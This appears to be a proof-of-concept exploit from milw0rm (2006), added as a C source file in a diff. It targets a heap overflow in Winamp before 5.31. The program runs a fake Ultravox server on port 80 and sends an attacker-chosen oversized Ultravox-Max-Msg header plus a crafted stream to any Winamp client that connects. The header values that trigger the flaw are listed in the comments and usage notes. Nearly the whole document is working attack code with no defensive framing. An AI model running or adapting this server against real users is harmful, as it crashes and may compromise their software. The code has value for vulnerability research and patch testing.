@@ -1,0 +1,217 @@
+/************************************************************************************
+Nullsoft Winamp < 5.31 Ultravox "Ultravox-Max-Msg" Heap Overflow Dos POC
+
+by cocoruder(frankruder_at_hotmail.com),2006/10/30
+
+use like "winamp_unsv.exe ultravox-max-msg_value",then the winamp_unsv(simple ultravox 
+server) will listen on tcp port 80,when winamp connect the server via ultravox protocol
+
+usage example:
+    winamp_unsv.exe 500000000
+    winamp_unsv.exe 2147481601
+
+**************************************************************************************/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+ 
+#define SERVER_PORT  80
+
+unsigned char    buff1_header1[]=
+"HTTP/1.0 200 OK\x0D\x0A"
+"Server: Ultravox 3.0\x0D\x0A"
+"Content-Type: misc/ultravox\x0D\x0A"
+"Ultravox-SID: 13381\x0D\x0A"
+"Ultravox-Avg-Bitrate: 16000\x0D\x0A"
+"Ultravox-Max-Bitrate: 24000\x0D\x0A"
+"Ultravox-Max-Msg: ";
+
+unsigned char    buff1_header2[]=
+"\x0D\x0A"
+"Ultravox-Stream-Info: Ultravox;Live Stream\x0D\x0A"
+"Ultravox-Msg-Que: 42\x0D\x0A"
+"Ultravox-Max-Fragments: 1\x0D\x0A\x0D\x0A";
+
+//4294965247
+//1073739776
+//1073739775
+//1000000000
+// 500000000
+//  50000000
+
+unsigned char    buff2[]=
+                                                        "\x5a\x00"
+"\x39\x01\x01\xe0\x00\x01\x00\x01\x00\x01\x3c\x6d\x65\x74\x61\x64"
+"\x61\x74\x61\x3e\x3c\x6c\x65\x6e\x67\x74\x68\x3e\x30\x3c\x2f\x6c"
+"\x65\x6e\x67\x74\x68\x3e\x3c\x73\x6f\x6f\x6e\x3e\x4d\x6f\x72\x65"
+"\x20\x6f\x6e\x20\x54\x48\x45\x20\x35\x30\x73\x3c\x2f\x73\x6f\x6f"
+"\x6e\x3e\x3c\x73\x6f\x6e\x67\x3e\x3c\x6e\x61\x6d\x65\x3e\x54\x69"
+"\x6e\x61\x20\x4d\x61\x72\x69\x65\x20\x28\x31\x39\x35\x35\x29\x3c"
+"\x2f\x6e\x61\x6d\x65\x3e\x3c\x61\x6c\x62\x75\x6d\x3e\x47\x72\x65"
+"\x61\x74\x65\x73\x74\x20\x48\x69\x74\x73\x3c\x2f\x61\x6c\x62\x75"
+"\x6d\x3e\x3c\x61\x72\x74\x69\x73\x74\x3e\x50\x65\x72\x72\x79\x20"
+"\x43\x6f\x6d\x6f\x20\x6f\x26\x23\x34\x37\x3b\x4d\x69\x74\x63\x68"
+"\x65\x6c\x6c\x20\x41\x79\x72\x65\x73\x3c\x2f\x61\x72\x74\x69\x73"
+"\x74\x3e\x3c\x61\x6c\x62\x75\x6d\x5f\x61\x72\x74\x3e\x78\x6d\x2f"
+"\x73\x74\x61\x74\x69\x6f\x6e\x5f\x6c\x6f\x67\x6f\x5f\x35\x2e\x6a"
+"\x70\x67\x3c\x2f\x61\x6c\x62\x75\x6d\x5f\x61\x72\x74\x3e\x3c\x73"
+"\x65\x72\x69\x61\x6c\x3e\x2d\x31\x3c\x2f\x73\x65\x72\x69\x61\x6c"
+"\x3e\x3c\x73\x6f\x6e\x67\x5f\x69\x64\x3e\x2d\x31\x3c\x2f\x73\x6f"
+"\x6e\x67\x5f\x69\x64\x3e\x3c\x61\x6d\x67\x5f\x73\x6f\x6e\x67\x5f"
+"\x69\x64\x3e\x2d\x31\x3c\x2f\x61\x6d\x67\x5f\x73\x6f\x6e\x67\x5f"
+"\x69\x64\x3e\x3c\x61\x6d\x67\x5f\x61\x72\x74\x69\x73\x74\x5f\x69"
+"\x64\x3e\x2d\x31\x3c\x2f\x61\x6d\x67\x5f\x61\x72\x74\x69\x73\x74"
+"\x5f\x69\x64\x3e\x3c\x61\x6d\x67\x5f\x61\x6c\x62\x75\x6d\x5f\x69"
+"\x64\x3e\x2d\x31\x3c\x2f\x61\x6d\x67\x5f\x61\x6c\x62\x75\x6d\x5f"
+"\x69\x64\x3e\x3c\x69\x74\x75\x6e\x65\x73\x5f\x73\x6f\x6e\x67\x5f"
+"\x69\x64\x3e\x2d\x31\x3c\x2f\x69\x74\x75\x6e\x65\x73\x5f\x73\x6f"
+"\x6e\x67\x5f\x69\x64\x3e\x3c\x69\x74\x75\x6e\x65\x73\x5f\x61\x72"
+"\x74\x69\x73\x74\x5f\x69\x64\x3e\x2d\x31\x3c\x2f\x69\x74\x75\x6e"
+"\x65\x73\x5f\x61\x72\x74\x69\x73\x74\x5f\x69\x64\x3e\x3c\x69\x74"
+"\x75\x6e\x65\x73\x5f\x61\x6c\x62\x75\x6d\x5f\x69\x64\x3e\x2d\x31"
+"\x3c\x2f\x69\x74\x75\x6e\x65\x73\x5f\x61\x6c\x62\x75\x6d\x5f\x69"
+"\x64\x3e\x3c\x2f\x73\x6f\x6e\x67\x3e\x3c\x2f\x6d\x65\x74\x61\x64"
+"\x61\x74\x61\x3e\x00\x5a\x00\x80\x03\x03\x67\xff\xf9\x5c\x40\x0b"
+"\xc1\x5c\x01\x62\x31\xa5\xe3\x40\x0e\x92\xda\x57\x42\x9c\xfa\x68"
+"\xd3\xb3\xdb\x4b\x69\x89\x04\x00\x00\x2b\x8c\xbb\x5f\x92\xf3\x34"
+"\x5a\x91\x5b\x43\xb0\xe1\x9b\x2f\x26\x66\x32\x67\x45\x59\x1e\x3c"
+"\x68\x87\xfd\x97\x96\xa5\x75\x18\x0a\x27\x04\x0f\x09\xeb\x20\xb4"
+"\x92\x0e\x18\xc5\xbc\xc8\xf8\xa6\x51\x12\x29\xe0\xf9\x81\x1b\xa6";
+
+ 
+int main (int argc, char *argv[])
+{
+   int                        i, num=1, rc, on = 1;
+   int                        listen_sd, accept_sd;
+   char                        buffer[80];
+   struct sockaddr_in        addr;
+   WSADATA                    wsadata;
+   unsigned char            *lpbuff;
+   DWORD                    bufflen;
+
+    int                        aa=-0x1000;
+   
+ 
+   WSAStartup(MAKEWORD(2,2),&wsadata);
+
+   listen_sd = socket(AF_INET, SOCK_STREAM, 0);
+   if (listen_sd < 0)
+   {
+      perror("socket() failed");
+      exit(-1);
+   }
+ 
+
+   rc = setsockopt(listen_sd,
+                   SOL_SOCKET,  SO_REUSEADDR,
+                   (char *)&on, sizeof(on));
+   if (rc < 0)
+   {
+      perror("setsockopt() failed");
+      closesocket(listen_sd);
+      exit(-1);
+   }
+ 
+    
+   
+   //Bind the socket 
+   memset(&addr, 0, sizeof(addr));
+   addr.sin_family      = AF_INET;
+   addr.sin_addr.s_addr = htonl(INADDR_ANY);
+   addr.sin_port        = htons(SERVER_PORT);
+   rc = bind(listen_sd,
+             (struct sockaddr *)&addr, sizeof(addr));
+   if (rc < 0)
+   {
+      perror("bind() failed");
+      closesocket(listen_sd);
+      exit(-1);
+   }
+ 
+
+   rc = listen(listen_sd, 5);
+   if (rc < 0)
+   {
+      perror("listen() failed");
+      closesocket(listen_sd);
+      exit(-1);
+   }
+ 
+
+   printf("The server is ready\n");
+
+
+   bufflen=sizeof(buff1_header1)-1+strlen(argv[1])+sizeof(buff1_header2)-1;
+   lpbuff=(unsigned char *)malloc(bufflen);
+   if (lpbuff==NULL)
+   {
+       printf("malloc error!\n");
+       return -1;
+   }
+
+   memset(lpbuff,0,bufflen);
+   strcat((char *)lpbuff,(char *)buff1_header1);
+   strcat((char *)lpbuff,(char *)argv[1]);
+   strcat((char *)lpbuff,(char *)buff1_header2);
+
+
+   for (i=0; i < num; i++)
+   {
+
+      printf("Interation: %d\n", i+1);
+      printf("  waiting on accept()\n");
+      accept_sd = accept(listen_sd, NULL, NULL);
+      if (accept_sd < 0)
+      {
+         perror("accept() failed");
+         closesocket(listen_sd);
+         exit(-1);
+      }
+      printf("  accept completed successfully\n");
+ 
+
+      printf("  wait for client to send us a message\n");
+
+      
+
+      rc = recv(accept_sd, buffer, sizeof(buffer), 0);
+      if (rc <= 0)
+      {
+         perror("recv() failed");
+         closesocket(listen_sd);
+         closesocket(accept_sd);
+         exit(-1);
+      }
+      printf("  <%s>\n", buffer);
+
+      rc= send(accept_sd,(char *)lpbuff,bufflen,0);
+      if (rc>0)
+      {
+          printf("send ultravox header OK!\n");
+      }
+
+
+      rc=send(accept_sd,(char *)buff2,sizeof(buff2)-1,0);
+      if (rc>0)
+      {
+          printf("send ultravox first stream OK!\n");
+      }
+          
+ 
+
+     while (1)
+     {
+         Sleep(1000);
+     }
+   }
+ 
+   closesocket(listen_sd);
+
+   return    0;
+
+}
+
+// milw0rm.com [2006-11-03]
